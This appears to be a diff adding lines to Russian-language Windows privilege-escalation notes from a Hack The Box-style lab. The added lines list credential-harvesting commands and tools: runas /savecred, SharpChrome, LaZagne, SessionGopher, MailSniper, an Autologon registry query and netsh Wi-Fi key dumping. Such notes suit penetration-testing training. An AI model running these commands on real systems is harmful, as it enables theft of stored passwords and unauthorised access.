@@ -71,9 +71,25 @@ wmic product get name
 
 # Cmdkey Сохраненные учетные данные
     cmdkey /list
-
-
-
+    runas /savecred /user:inlanefreight\bob "COMMAND HERE"
+# Учетные данные браузера
+    .\SharpChrome.exe logins /unprotect
+# Менеджеры паролей 
+    .kdbx
+# Электронная почта
+    https://github.com/dafthack/MailSniper
+# учетные данные из самых разных программ  инструмент LaZagne 
+    https://github.com/AlessandroZ/LaZagne
+    .\lazagne.exe all
+# извлечения сохраненных учетных данных PuTTY, WinSCP, FileZilla, SuperPuTTY и RDP --> SessionGopher
+    https://github.com/Arvanaghi/SessionGopher
+    PS C:\htb> Import-Module .\SessionGopher.ps1
+     PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01 (имя твоего компа)
+# Перечисление Autologon с помощью reg.exe 
+    query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+# Восстановление сохраненных паролей беспроводной сети 
+    netsh wlan show profile ilfreight_corp key=clear
+    
 
 
 
